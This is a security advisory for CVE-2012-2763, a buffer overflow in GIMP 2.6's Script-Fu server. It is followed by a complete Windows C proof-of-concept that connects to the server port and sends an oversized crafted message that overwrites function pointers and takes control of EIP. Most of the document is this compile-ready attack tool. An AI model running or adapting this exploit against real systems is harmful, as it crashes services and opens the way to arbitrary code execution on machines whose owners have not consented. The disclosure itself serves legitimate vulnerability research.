# There is a buffer overflow in the script-fu server component of GIMP 
# (the GNU Image Manipulation Program) in all 2.6 versions (Windows and Linux
# versions) affecting both 
# the script-fu console and the script-fu network server. A crafted msg to the
# script-fu server overflows a buffer and overwrites several function pointers
# allowing the attacker to gain control of EIP and potentially execute
# arbitrary 
# code. This issue is fixed in the latest, stable GIMP version (currently 2.8.0).
#
# CVE number: CVE-2012-2763
# Impact: high
# Vendor Homepage: http://www.gimp.org/
# Date found: 18/05/2012
# Found by: d of Reaction Information Security
# Homepage: http://www.reactionpenetrationtesting.co.uk


====
POC
====


////////////////////////////////////////////////////////////////
//															  //
// PoC for GIMP <= 2.6 Script-Fu server buffer overflow       //
// Author: Joseph Sheridan				      //
// Date: 20/05/2012					      //
//															  //
// compile with	cl scriptfubof.c /link wsock32.lib            //
////////////////////////////////////////////////////////////////

#define WIN32_LEAN_AND_MEAN
#include <winsock2.h>
#include <stdlib.h>
#include <stdio.h>
#include <string.h>
 
#define DEFAULT_PORT 10008
// TCP socket type
#define DEFAULT_PROTO SOCK_STREAM
void senddata();
void recvdata();
WSADATA wsaData;
SOCKET  conn_socket;
char Buffer[2000000];
char inBuffer[128];
	
void Usage()
{
	printf("Usage: scriptfubof servername portnumber\n");
	fflush(stdout);
	exit(1);
}
  
int main(int argc, char *argv[])
{
	
	// default to localhost
	char *server_name= "localhost";
	unsigned short port = DEFAULT_PORT;
	int i, loopcount, maxloop=-1;
	int retval;
	unsigned int addr;
	int socket_type = DEFAULT_PROTO;
	struct sockaddr_in server;

	if (argc < 3) {
		Usage();
	}
	
	if ((retval = WSAStartup(0x202, &wsaData)) != 0)
	{
	   fprintf(stderr,"WSAStartup() failed with error %d\n", retval);
		WSACleanup();
		return -1;
	}
	
	//	Get portnum
	port = atoi(argv[2]);
	
	memset(&server, 0, sizeof(server));
	server.sin_addr.s_addr = inet_addr(argv[1]);
	server.sin_family = AF_INET;
	server.sin_port = htons(port);
 
	conn_socket = socket(AF_INET, socket_type, 0); /* Open a socket */
	if (conn_socket <0 )
	{
		fprintf(stderr,"Client: Error Opening socket: Error %d\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
	
	if (connect(conn_socket, (struct sockaddr*)&server, sizeof(server)) == SOCKET_ERROR)
	{
		fprintf(stderr,"Client: connect() failed: %d\n", WSAGetLastError());
		WSACleanup();
		return -1;
	}
 
	// Send the data
	senddata();

	// recieve a msg
	recvdata();
	
	closesocket(conn_socket);
	WSACleanup();
 
return 0;
}

void senddata() {

	int loopcount = 0, retval =0;
	unsigned char command[]="aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa";
		
	
	Buffer[0]='\x47'; //Magic byte 'G'
	Buffer[1]=sizeof(command)/256; //High byte of L - L div 256
	Buffer[2]=sizeof(command)%256; //Low byte of L - L mod 256
	strcpy(&Buffer[3],command);
	
	retval = send(conn_socket, Buffer, sizeof(command) +3, 0);
	if (retval == SOCKET_ERROR)
	{
		fprintf(stderr,"Client: send() failed: error %d.\n", WSAGetLastError());
		WSACleanup();
		return;
	}
	else
	  printf("Client: send() is OK.\n");
	printf("Client: Sent data \"%s\"\n", Buffer);
	
}

void recvdata() {
	int i=0;
	int retval=0;
	memset(inBuffer,0,128);
	
	retval = recv(conn_socket, inBuffer, 128, 0);
	printf("retval is :%d\n", retval);
	printf("first char is: %x\n", inBuffer[0]);
	if (retval == SOCKET_ERROR)
   {
		fprintf(stderr,"Client: recv() failed: error %d.\n", WSAGetLastError());
		closesocket(conn_socket);
		WSACleanup();
		return;
	}
	else {
		printf("Client: recv() is OK.\n");
		
		// print the message contents...
		
		for (i=0;i<retval;i++) {
			printf("%c", inBuffer[i]);
			
		}
		printf("\n");
		fflush(stdout);
   }

}